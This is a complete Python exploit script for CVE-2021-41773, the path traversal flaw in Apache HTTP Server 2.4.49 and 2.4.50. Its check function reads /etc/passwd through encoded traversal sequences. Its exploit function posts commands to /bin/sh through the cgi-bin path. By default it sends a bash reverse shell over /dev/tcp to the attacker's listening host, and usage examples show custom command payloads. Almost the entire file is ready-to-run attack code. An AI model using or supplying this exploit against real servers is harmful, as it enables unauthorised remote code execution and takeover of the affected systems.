#!/usr/bin/env python3
"""
CVE-2021-41773 - Apache 2.4.49 Path Traversal RCE Exploit
Affects: Apache HTTP Server 2.4.49 and 2.4.50
Severity: Critical (CVSS 9.8)
"""

import requests
import argparse
import sys
import time

def test_vulnerable(target):
    """Test if target is vulnerable to CVE-2021-41773"""
    path = "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
    url = target + path
    
    try:
        r = requests.get(url, timeout=5)
        if r.status_code == 200 and ('root:' in r.text or 'bin:' in r.text):
            return True
        return False
    except Exception as e:
        print(f"[-] Error testing vulnerability: {e}")
        return False

def exploit(target, lhost, lport, payload=None, verify=True):
    """Execute RCE payload on vulnerable Apache server"""
    
    if verify:
        print(f"[*] Testing if {target} is vulnerable...")
        if not test_vulnerable(target):
            print("[-] Target does not appear vulnerable")
            return False
        print("[+] Target is VULNERABLE!")
    
    # CVE-2021-41773 path traversal to /bin/sh
    path = "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
    url = target + path
    
    # Default payload: reverse shell
    if not payload:
        payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    
    print(f"[*] Target: {target}")
    print(f"[*] Exploit URL: {url}")
    print(f"[*] Payload: {payload}")
    
    try:
        print("[*] Sending payload...")
        r = requests.post(url, data=payload, timeout=10)
        
        if r.status_code in [200, 500]:  # 500 is expected for RCE
            print(f"[+] Payload sent! Status: {r.status_code}")
            print(f"[+] Check your listener on {lhost}:{lport}")
            return True
        else:
            print(f"[-] Unexpected status code: {r.status_code}")
            return False
            
    except requests.exceptions.Timeout:
        print("[+] Request timeout (shell may have executed)")
        return True
    except Exception as e:
        print(f"[-] Error sending payload: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(
        description="CVE-2021-41773 - Apache 2.4.49/2.4.50 RCE Exploit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic reverse shell
  python3 apache_cve.py -t http://target.com -l 192.168.1.100 -p 4444
  
  # Test vulnerability without exploit
  python3 apache_cve.py -t http://target.com --test-only
  
  # Custom payload
  python3 apache_cve.py -t http://target.com -l 192.168.1.100 -p 4444 \\
    --payload "id > /tmp/pwned.txt"
  
  # Don't verify before exploiting
  python3 apache_cve.py -t http://target.com -l 192.168.1.100 -p 4444 --no-verify
        """
    )
    
    parser.add_argument(
        '-t', '--target',
        required=True,
        help='Target URL (e.g., http://192.168.1.100 or http://target.com:8080)'
    )
    
    parser.add_argument(
        '-l', '--lhost',
        help='Your listening IP address for reverse shell'
    )
    
    parser.add_argument(
        '-p', '--lport',
        type=int,
        help='Your listening port for reverse shell'
    )
    
    parser.add_argument(
        '--payload',
        help='Custom payload to execute (default: bash reverse shell)'
    )
    
    parser.add_argument(
        '--test-only',
        action='store_true',
        help='Only test for vulnerability, do not exploit'
    )
    
    parser.add_argument(
        '--no-verify',
        action='store_true',
        help='Skip vulnerability test before exploiting'
    )
    
    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Verbose output'
    )
    
    args = parser.parse_args()
    
    # Validate target URL
    if not args.target.startswith('http'):
        args.target = 'http://' + args.target
    
    # Test-only mode
    if args.test_only:
        print(f"[*] Testing {args.target} for CVE-2021-41773...")
        if test_vulnerable(args.target):
            print("[+] Target is VULNERABLE!")
            return 0
        else:
            print("[-] Target is not vulnerable")
            return 1
    
    # RCE mode - requires lhost and lport
    if not args.lhost or not args.lport:
        print("[-] Error: --lhost and --lport required for exploitation")
        print("[*] Use --test-only to check vulnerability without exploiting")
        parser.print_help()
        return 1
    
    # Execute exploit
    if args.verbose:
        print(f"[DEBUG] Target: {args.target}")
        print(f"[DEBUG] LHOST: {args.lhost}")
        print(f"[DEBUG] LPORT: {args.lport}")
        print(f"[DEBUG] Verify: {not args.no_verify}")
    
    success = exploit(
        target=args.target,
        lhost=args.lhost,
        lport=args.lport,
        payload=args.payload,
        verify=not args.no_verify
    )
    
    return 0 if success else 1

if __name__ == "__main__":
    sys.exit(main())
